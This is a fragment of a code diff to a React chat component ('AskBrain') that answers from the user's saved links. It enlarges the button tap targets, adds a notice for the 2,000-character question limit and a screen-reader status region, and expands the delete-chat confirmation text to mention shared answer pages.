+                            // 36px drawn, 44pt to the finger (the ::after).
+                            className="shrink-0 relative after:absolute after:-inset-1"
                         >
                             <Square className="w-3.5 h-3.5 fill-current" />
                         </IconButton>
@@ -1697,12 +1885,18 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
                             disabled={!uid || !input.trim()}
                             aria-label="Send"
                             variant="primary"
-                            className="shrink-0"
+                            className="shrink-0 relative after:absolute after:-inset-1"
                         >
                             <ArrowUp className="w-5 h-5" />
                         </IconButton>
                     )}
                 </div>
+                {/* Said only once the cap is reached, where the typing stops. */}
+                {input.length >= MAX_QUESTION_CHARS && (
+                    <p className="mt-1.5 ms-1 text-[12px] text-text-muted">
+                        Questions can be up to 2,000 characters.
+                    </p>
+                )}
                 <p className="hidden sm:block text-center text-[11px] text-text-muted mt-2">
                     Answers are grounded only in what you&apos;ve saved.
                 </p>
@@ -1719,6 +1913,12 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
                 : 'flex min-h-[360px]'
                 }`}
         >
+            {/* The one status line a screen reader hears: always mounted (a
+                live region that appears with its text is often not read),
+                fed the thinking phrase, then "Answer ready" or the error. The
+                streaming answer itself is deliberately NOT live. */}
+            <div className="sr-only" role="status" aria-live="polite">{liveStatus}</div>
+
             {/* Desktop: persistent history panel beside the chat. */}
             {!isMobile && (
                 <ChatHistorySidebar
@@ -1756,7 +1956,12 @@ export default function AskBrain({ uid, totalLinks, onOpenLink, onExit, onBackTo
                 onClose={() => setChatToDelete(null)}
                 onConfirm={confirmDeleteChat}
                 title="Delete this chat?"
-                message="This permanently removes the conversation from your history. Your saved cards aren’t affected."
+                message={`This permanently removes the conversation from your history. Your saved cards aren’t affected.${(() => {
+                    const n = chatToDelete ? sharedPagesOf(chatToDelete).length : 0;
+                    return !n ? '' : n === 1
+                        ? ' Its shared answer page stops working within a minute.'
+                        : ` Its ${n} shared answer pages stop working within a minute.`;
+                })()}`}
                 confirmLabel="Delete"
                 cancelLabel="Keep it"
                 variant="danger"
